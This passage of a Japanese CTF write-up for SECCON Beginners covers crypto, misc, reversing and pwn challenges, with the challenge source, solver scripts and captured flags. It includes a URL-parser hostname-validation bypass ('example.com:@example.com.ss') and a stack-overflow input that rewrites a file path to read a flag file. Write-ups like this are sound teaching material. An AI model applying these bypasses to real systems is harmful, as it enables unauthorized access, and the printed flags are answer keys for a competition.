# 1100011011101000110011000110100011000100111101101101110001100000111011101011111011110010011000001110101001001110111001000110011010111110011010001011111011000100011000101101110001101000111001000110001001100110110111001111101
# ctf4b{n0w_y0u'r3_4_b1n4r13n}
{{< /code >}}

### Elliptic4b [171 Solve (272 medium)]
> 楕円曲線だからってそっ閉じしないで！  
nc elliptic4b.challenges.beginners.seccon.jp 9999  
 
楕円曲線 secp256k1 は $y^2=x^3+7$ である．

この問題では，与えられた $y$ に対する $x$ を求め，$P=(x, y)$ に対して，$aP=(x, -y)$ となる $a\geq0$ を求めればよい．
すなわち，最終的には $P$ の逆元 $-P=(x, -y)$ を求めればよい．これは，位数$n$ に対して $a=n-1$ とすれば求まる．

```py
import os
import secrets
from fastecdsa.curve import secp256k1
from fastecdsa.point import Point

flag = os.environ.get("FLAG", "CTF{dummy_flag}")
y = secrets.randbelow(secp256k1.p)
print(f"{y = }")
x = int(input("x = "))
if not secp256k1.is_point_on_curve((x, y)):
    print("// Not on curve!")
    exit(1)
a = int(input("a = "))
P = Point(x, y, secp256k1)
Q = a * P
if a < 0:
    print("// a must be non-negative!")
    exit(1)
if P.x != Q.x:
    print("// x-coordinates do not match!")
    exit(1)
if P.y == Q.y:
    print("// P and Q are the same point!")
    exit(1)
print("flag =", flag)
```

与えられた $y$ に対する $x$ は 立方根を計算することで求まる．

{{< code lang="py" title="solver.sage" hl_lines="">}}
# secp256k1 prime
p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 # 位数
F = GF(p)
y = F(64113021656958798867216908193475868588458116237961285548369416356243964319959)
z = y^2 - 7

R.<X> = PolynomialRing(F)
f = X^3 - z
roots = f.roots()

if roots:
    x = roots[0][0] # (解，重複度)のタプルのリスト
    print("Found x:", int(x))
    print("n-1:", n-1)
else:
    print("No solution for x.")

# Found x: 47519497305917046196065964482720223974721953930099609061719618403847890333750
# n-1: 115792089237316195423570985008687907852837564279074904382605163141518161494336
{{< /code >}}

よって，以下のように得られる．

```
$ nc elliptic4b.challenges.beginners.seccon.jp 9999
y = 64113021656958798867216908193475868588458116237961285548369416356243964319959
x = 47519497305917046196065964482720223974721953930099609061719618403847890333750
a = 115792089237316195423570985008687907852837564279074904382605163141518161494336
flag = ctf4b{1et'5_b3c0m3_3xp3r7s_1n_3ll1p71c_curv35!}
```


## misc
### kingyo_sukui [644 Solve (100 beginner)]
> scooping! http://kingyo-sukui.challenges.beginners.seccon.jp:33333  

金魚すくいで正しい順に文字をすくうとflagになる．

開発者ツールで見ると，順番が書かれていた．

```html
<div class="flag-container" id="flag-container">
    <div class="flag-char" data-index="16" style="left: 142.004px; top: 234.333px;">}</div>
    <div class="flag-char" data-index="14" style="left: 212.249px; top: 245.584px;">r</div>
    <div class="flag-char" data-index="3" style="left: 471.704px; top: 245.03px;">4</div>
    <div class="flag-char" data-index="1" style="left: 93.9794px; top: 347.381px;">t</div>
    <div class="flag-char" data-index="2" style="left: 211.187px; top: 24.672px;">f</div>
    <div class="flag-char" data-index="7" style="left: 104.975px; top: 277.571px;">4</div>
    <div class="flag-char" data-index="5" style="left: 283.312px; top: 109.482px;">{</div>
    <div class="flag-char" data-index="10" style="left: 216.414px; top: 45.3561px;">m</div>
    <div class="flag-char" data-index="0" style="left: 271.9px; top: 54.5546px;">c</div>
    <div class="flag-char" data-index="4" style="left: 159.43px; top: 209.986px;">b</div>
    <div class="flag-char" data-index="11" style="left: 153.112px; top: 234.26px;">a</div>
    <div class="flag-char" data-index="6" style="left: 207.959px; top: 159.728px;">n</div>
    <div class="flag-char" data-index="15" style="left: 178.28px; top: 150.448px;">1</div>
    <div class="flag-char" data-index="9" style="left: 379.457px; top: 329.116px;">u</div>
    <div class="flag-char" data-index="12" style="left: 390.8px; top: 64.0435px;">7</div>
    <div class="flag-char" data-index="13" style="left: 142.662px; top: 205.096px;">u</div>
    <div class="flag-char" data-index="8" style="left: 179.978px; top: 105.609px;">7</div>
</div>
```

`ctf4b{n47uma7ur1}`

### url-checker [606 Solve (100 easy)]
>有効なURLを作れますか？  
nc url-checker.challenges.beginners.seccon.jp 33457  

urlparse(user_input).hostname が `example.com` と同じではなく，`example.com`で始まるようにすればよい．

```py
from urllib.parse import urlparse

print(
    r"""
 _   _ ____  _        ____ _               _             
| | | |  _ \| |      / ___| |__   ___  ___| | _____ _ __ 
| | | | |_) | |     | |   | '_ \ / _ \/ __| |/ / _ \ '__|
| |_| |  _ <| |___  | |___| | | |  __/ (__|   <  __/ |   
 \___/|_| \_\_____|  \____|_| |_|\___|\___|_|\_\___|_|   

allowed_hostname = "example.com"                                                         
>> """,
    end="",
)

allowed_hostname = "example.com"
user_input = input("Enter a URL: ").strip()
parsed = urlparse(user_input)

try:
    if parsed.hostname == allowed_hostname:
        print("You entered the allowed URL :)")
    elif parsed.hostname and parsed.hostname.startswith(allowed_hostname):
        print(f"Valid URL :)")
        print("Flag: ctf4b{dummy_flag}")
    else:
        print(f"Invalid URL x_x, expected hostname {allowed_hostname}, got {parsed.hostname if parsed.hostname else 'None'}")
except Exception as e:
    print("Error happened")
```

```
$ nc url-checker.challenges.beginners.seccon.jp 33457

 _   _ ____  _        ____ _               _
| | | |  _ \| |      / ___| |__   ___  ___| | _____ _ __
| | | | |_) | |     | |   | '_ \ / _ \/ __| |/ / _ \ '__|
| |_| |  _ <| |___  | |___| | | |  __/ (__|   <  __/ |
 \___/|_| \_\_____|  \____|_| |_|\___|\___|_|\_\___|_|

allowed_hostname = "example.com"
>> Enter a URL: https://example.com.ss
Valid URL :)
Flag: ctf4b{574r75w17h_50m371m35_n07_53cur37}
```

### url-checker2 [524 Solve (100 medium)]
>有効なURLを作れますか？ Part2  
nc url-checker2.challenges.beginners.seccon.jp 33458  

urlparse(user_input).hostname が `example.com` と同じではなく，`example.com`で始まるようにする．

さらに，urlparse(user_input).netloc を `:` で分割した最初の要素は `example.com` と同じである必要がある．

```py
from urllib.parse import urlparse

print(
    r"""
 _   _ ____  _        ____ _               _            ____  
| | | |  _ \| |      / ___| |__   ___  ___| | _____ _ _|___ \ 
| | | | |_) | |     | |   | '_ \ / _ \/ __| |/ / _ \ '__|__) |
| |_| |  _ <| |___  | |___| | | |  __/ (__|   <  __/ |  / __/ 
 \___/|_| \_\_____|  \____|_| |_|\___|\___|_|\_\___|_| |_____|
                                                              
allowed_hostname = "example.com"                                                         
>> """,
    end="",
)

allowed_hostname = "example.com"
user_input = input("Enter a URL: ").strip()
parsed = urlparse(user_input)

# Remove port if present
input_hostname = None
if ':' in parsed.netloc:
    input_hostname = parsed.netloc.split(':')[0]

try:
    if parsed.hostname == allowed_hostname:
        print("You entered the allowed URL :)")
    elif input_hostname and input_hostname == allowed_hostname and parsed.hostname and parsed.hostname.startswith(allowed_hostname):
        print(f"Valid URL :)")
        print("Flag: ctf4b{dummy_flag}")
    else:
        print(f"Invalid URL x_x, expected hostname {allowed_hostname}, got {parsed.hostname if parsed.hostname else 'None'}")
except Exception as e:
    print("Error happened")
```

URLでは以下のような形式をとることができる．

```
scheme://username:password@hostname:port/path?query#fragment
```
よって，`https://example.com:@example.com.ss`とすればよい．

```
$ nc url-checker2.challenges.beginners.seccon.jp 33458

 _   _ ____  _        ____ _               _            ____
| | | |  _ \| |      / ___| |__   ___  ___| | _____ _ _|___ \
| | | | |_) | |     | |   | '_ \ / _ \/ __| |/ / _ \ '__|__) |
| |_| |  _ <| |___  | |___| | | |  __/ (__|   <  __/ |  / __/
 \___/|_| \_\_____|  \____|_| |_|\___|\___|_|\_\___|_| |_____|

allowed_hostname = "example.com"
>> Enter a URL: https://example.com:@example.com.ss
Valid URL :)
Flag: ctf4b{cu570m_pr0c3551n6_0f_url5_15_d4n63r0u5}
```

## reversing
### CrazyLazyProgram1 [654 Solve (100 beginner)]
> 改行が面倒だったのでワンライナーにしてみました。  

```py
using System;class Program {static void Main() {int len=0x23;Console.Write("INPUT > ");string flag=Console.ReadLine();if((flag.Length)!=len){Console.WriteLine("WRONG!");}else{if(flag[0]==0x63&&flag[1]==0x74&&flag[2]==0x66&&flag[3]==0x34&&flag[4]==0x62&&flag[5]==0x7b&&flag[6]==0x31&&flag[7]==0x5f&&flag[8]==0x31&&flag[9]==0x69&&flag[10]==0x6e&&flag[11]==0x33&&flag[12]==0x72&&flag[13]==0x35&&flag[14]==0x5f&&flag[15]==0x6d&&flag[16]==0x61&&flag[17]==0x6b&&flag[18]==0x33&&flag[19]==0x5f&&flag[20]==0x50&&flag[21]==0x47&&flag[22]==0x5f&&flag[23]==0x68&&flag[24]==0x61&&flag[25]==0x72&&flag[26]==0x64&&flag[27]==0x5f&&flag[28]==0x32&&flag[29]==0x5f&&flag[30]==0x72&&flag[31]==0x33&&flag[32]==0x61&&flag[33]==0x64&&flag[34]==0x7d){Console.WriteLine("YES!!!\nThis is Flag :)");}else{Console.WriteLine("WRONG!");}}}}
```

`ctf4b{1_1in3r5_mak3_PG_hard_2_r3ad}`


## pwnable
### pet_name [586 Solve (100 beginner)]
> ペットに名前を付けましょう。ちなみにフラグは/home/pwn/flag.txtに書いてあるみたいです。  
nc pet-name.challenges.beginners.seccon.jp 9080  

スタックのバッファオーバーフローで文字列を上書きする．

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init() {
    // You don't need to read this because it's just initialization
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
}

int main() {
    init();

    char pet_name[32] = {0};
    char path[128] = "/home/pwn/pet_sound.txt";

    printf("Your pet name?: ");
    scanf("%s", pet_name);

    FILE *fp = fopen(path, "r");
    if (fp) {
        char buf[256] = {0};
        if (fgets(buf, sizeof(buf), fp) != NULL) {
            printf("%s sound: %s\n", pet_name, buf);
        } else {
            puts("Failed to read the file.");
        }
        fclose(fp);
    } else {
        printf("File not found: %s\n", path);
    }
    return 0;
}
```

32バイト分だけパディングすればよい．

```
$ nc pet-name.challenges.beginners.seccon.jp 9080
Your pet name?: 12345678901234567890123456789012/home/pwn/flag.txt
12345678901234567890123456789012/home/pwn/flag.txt sound: ctf4b{3xp1oit_pet_n4me!}
```

